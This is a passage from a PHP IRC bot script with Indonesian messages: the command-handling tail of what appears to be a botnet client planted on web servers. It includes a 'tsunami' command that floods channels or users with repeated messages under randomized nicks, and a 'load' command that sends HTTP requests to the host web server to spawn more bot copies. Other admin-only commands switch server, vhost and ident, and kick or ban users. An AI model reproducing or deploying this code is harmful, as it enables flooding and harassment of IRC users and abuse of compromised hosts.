                 if (substr($dCommand,0,3)=='433') {
                   $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                   fputs($fp, 'NICK '.$nicktsu . CRL);
                 }
                 $msg = strstr($data,":`fuckz");
                 $msg = str_replace(":`tsunami $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :TSUNAMI'.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':`load') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                   $bhost = $_SERVER['HTTP_HOST'];
                   $bruri = $_SERVER['REQUEST_URI'];
                   if ($com[4]) { $jmlbot = $com[4]; }
                   else { $jmlbot = 1; }
                   for ($i=1;$i<=$com[4];$i++) {
                     $soket = fsockopen($bhost,80,$errno,$errstr,10);
                     fputs($soket,"GET $bruri HTTP/1.0\r\nHost: $bhost\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n");
                     fclose($soket);
                   }
                   fputs($fp,"NOTICE $dNick :".$com[4]." Bot(s) loaded!".CRL);
                 }
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PRIVMSG '.$dNick.' :No Help!' . CRL);
               }
             }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand)) {
             if ($log=="on") {
               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
             }
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

rx();

?>
